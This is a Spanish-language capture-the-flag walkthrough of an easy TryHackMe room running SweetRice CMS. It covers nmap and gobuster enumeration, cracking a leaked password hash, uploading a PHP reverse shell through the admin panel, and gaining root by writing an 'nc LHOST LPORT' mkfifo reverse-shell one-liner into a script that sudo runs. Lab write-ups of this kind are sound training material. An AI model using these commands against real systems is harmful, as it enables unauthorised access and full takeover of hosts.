Bievenidos a otra sala en modo facil en TryHackMe. En esta ocasion usamos nuestro escaneo nmap para averiguar puertos abiertos. Luego enumeraremos con la herramienta `gobuster` para encontrar directorio ocultos dentro del servidor web. Confiscaremos las credenciales dentro de los directorios ocultos y generamos una reverse shell dentro de nuestra maquina atacante para poder enumerarla y escalar privilegios dentro del sistema enumerando permisos de superusuario.

# Recon
Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.22s latency).
Scanned at 2023-07-01 06:48:25 EDT for 23s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap

```

Nuestro escaneo de nmap nos muestra 2 puertos abiertos. Al navegar por el servidor web podemos ver que pertenece a un servidor apache y que no tenemos mucho que hacer en estos casos. Pasamos a enumerar directorios ocultos con la herramienta `gobuster`

Ejecutamos : `gobuster dir -u http://IPTARGET -w /Path/Wordlists`

```bash
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGET/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/01 06:52:31 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/content (Status: 301)
```

Encontramos /content como directorio oculto, pero nuevamente no podemos hacer mucho. En esto casos es mejor volver a utilizar gobuster pero enumerando el directorio que acabamos de descubrir /content.

Ejecutamos :`gobuster dir -u http://IPTARGET/content -w /Path/Wordlists`

```bash
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://IPTARGET/content/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirb/wordlists/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/07/01 06:55:52 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/_themes (Status: 301)
/as (Status: 301)
/attachment (Status: 301)
/images (Status: 301)
/inc (Status: 301)
/js (Status: 301)
Progress: 17512 / 20470 (85.55%)
```

Vemos varios directorios que pertenecen a /content. Una vez nos explorados, en el directorio /inc encontramos una carpeta **my_sql** que contiene un archivo backup.

# Intrusion

Una vez descargado el backup, usamo `cat` para ver el contenido por posibles credenciales del usuario. Si nos fijamos en esta parte del backup, vamos a obtener las credenciales que utiliza nuestra victima dentro del servidor web. 

```bash
"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice 
```

Vemos que la password esta protegida, en este caso utilizamos `hascat` o `crackstation` para poder crackearla. Como alternativa a `crackstation` podes ejecutar hashcat de la siguiente forma :

Primero, tenemos que descubrir que tipo de hash para poder indicarle a hashcat el tipo de hash que tiene que trabajar.

```
hashid "42f749ade7f9e195bf475f37a44cafcb"

hashcat -m 0 hash.txt /Path/Wordlists
```

Nos dirigimos al directorio /content/as para poder iniciar sesion con las credenciales que obtuvimos recientemente.

## Reverse shell

Buscaremos alguna columna que nos permita realizar una reverse shell dentro de nuestra maquina atacante. En la columna de **ads** nos indica que podemos editar codigo ads y ponerlo dentro de template. Nombramos test.php y pegamos nuestra reverse shell, bien conocida de pentestmonkey y nos ponemos en escucha en nuestra maquina atacante. 

`nc -nvlp LHOST`

Cargada nuestra shell, navegamos al directorio /content/inc en la carpeta /ads y clickeamos test.php. Revisamos nuestra shell y vemos que nuestro reverse shell se realizo con exito.

# Priv.Escalation

Upgradeamos nuestra shell para movermos libremente dentro del sistema

```bash
script /dev/null -c bash
  CTRL+Z
  stty raw -echo;fg
  export TERM=xterm
```

Podemos listar permisos con `sudo -l` y vemos que tiene permisos root ejecutando perl en el directorio /home/itguy/backup.pl.

Bien, ya sabemos la forma en la que podemos escalar privilegios, tenemos que echarle un vistazo al archivo "backup.pl" . `cat backup.pl`

```bash
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

 Vemos que el comando system está siendo utilizado para ejecutar un script de shell llamado copy.sh ubicado en /etc/. Podemos modificar el archivo **copy.sh** con una reverse shell que nos dara una terminal con privilegios de usuario raiz root.
Para esto, tenemos que dirigirnos al directorio **/etc** y sobreescribir el archivo utilizando echo.

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f" > copy.sh
```

Nos ponemos en escucha y ejecutamos /usr/bin/perl como superusuario.

```bash
nc -nvlp LPORT --> Maquina atacante

sudo /usr/bin/perl /home/itguy/backup.pl
```
